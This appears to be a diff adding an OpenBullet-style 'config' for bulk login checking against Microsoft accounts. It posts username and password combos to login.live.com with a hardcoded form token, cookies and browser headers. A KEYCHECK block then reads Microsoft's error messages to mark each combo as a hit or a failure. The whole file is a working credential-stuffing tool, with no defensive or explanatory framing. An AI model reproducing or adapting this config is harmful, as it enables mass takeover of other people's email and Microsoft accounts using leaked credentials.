@@ -1,0 +1,88 @@
+[SETTINGS]
+{
+  "Name": "microsoftzuhahahah",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-20T20:57:46.1025018+03:00",
+  "AdditionalInfo": "",
+  "Author": "saas",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&ct=1612156718&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d371440b3-baf6-4561-7291-a8475010d518&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&contextid=A676174CEA807559&bk=1612156718&uaid=eac14b8e69e2456dac6f09e4d8fd5c29&pid=0" 
+  CONTENT "i13=0&login=<USER>&loginfmt=<USER>&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=<PASS>&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=DVt5wMNpRWjXQ39XxpPzC95r1e4G*nrMYPYP5CuGhovlAEhSF9zLAAEd8UxhgA8%21MkuHumNasujy%21qJInWgOmBz%21bWP9nR5BNhkjVJExypHDLjoerdnO3gYEiA6xaOTdIDVt1cV7BD764cX0ggS3EX1uNpbzXbwnaQSuFUJkIKr83io8oanVh0RXCKLHY5a1O7G1LMk7CKW8rcB44JBPmZhiAX6NtzZTkjvkKNhgvDtHtkryXXx3VJyFpI4Ijy5oOQ%24%24&PPSX=Passp&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&i2=1&i17=0&i18=&i19=45531" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "Cookie: wla42=; logonLatency=LGN01=637477535180292679; uaid=eac14b8e69e2456dac6f09e4d8fd5c29; MSPRequ=id=292841&lt=1612156718&co=1; MSCC=180.254.227.217-ID; OParams=11DQPfl6fX1psuOFjwm6B0dyw18*nhfw34ueM39UqXS5Q9D1*IvLQp0Bg0VGE21HV!Z2Ek7RdVkZXVks32giw*v5z5TQlt6q*hVqm1AOUSCcNTIh626ID!mOzU5jFA04Gb5hhmf3pnfc0IPIenaYKCZKIwMY12xAohLHau4nsBBPkHygsOfW7jXlT4eUv4gbvpxpWc!fGa!Irmf*b8Bq5AiaLgMuGsTJ*PGHLa1JcwL*!5sk*p*Bhhuifs2agmJJ5XJ8WCh33nVeCeAe0QDEYe2EcqjP8N2OyoQeCG8Cc2pdhAksXddhLh7DfVA51mFGQRfChMwqxNvnKxGZh1w!OIfN6H8k2Hxj4VVEzIJt5yEb98ARPbSKCXQppkSDwjk3WhOfvjkA6lagdfTljrjfpGokC7fMs9O8xGpSdOw4gHMPZFN1z6XZDYmOVnm15jnilADOK33zSy4KRjbnZXH693UoFN3VNAhbXw8Nx9yn3!ZTxh3IKp9677iXeYCFi9XY*hWc6edF4mjIP8bjDTHtUHp5g$; MSPOK=$uuid-20aa44ff-7d54-4cc0-bf04-a24226bfe668$uuid-e93dbb55-bb5c-4d79-83d6-60d6f31e0be4$uuid-9beed6f5-8b8a-4ebf-ad2e-85fd6b0d9b8f; wlidperf=FR=L&ST=1612156763222" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36" 
+  HEADER "Host: login.live.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 632" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "sec-ch-ua: \"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Origin: https://login.live.com" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1612156718&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d371440b3-baf6-4561-7291-a8475010d518&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "The account or password is incorrect. Please try again." 
+    KEY "<SOURCE>" DoesNotContain "That Microsoft account doesn\\'t exist." 
+    KEY "<SOURCE>" DoesNotContain "If you don\\'t remember your password," 
+    KEY "<SOURCE>" DoesNotContain "believe your credentials are at risk." 
+    KEY "<SOURCE>" DoesNotContain "You\\'ve tried to sign in too many times with an incorrect account or password." 
+  KEYCHAIN Failure OR 
+    KEY "The account or password is incorrect. Please try again." 
+    KEY "That Microsoft account doesn\\'t exist." 
+    KEY "If you don\\'t remember your password," 
+    KEY "You\\'ve tried to sign in too many times with an incorrect account or password." 
+
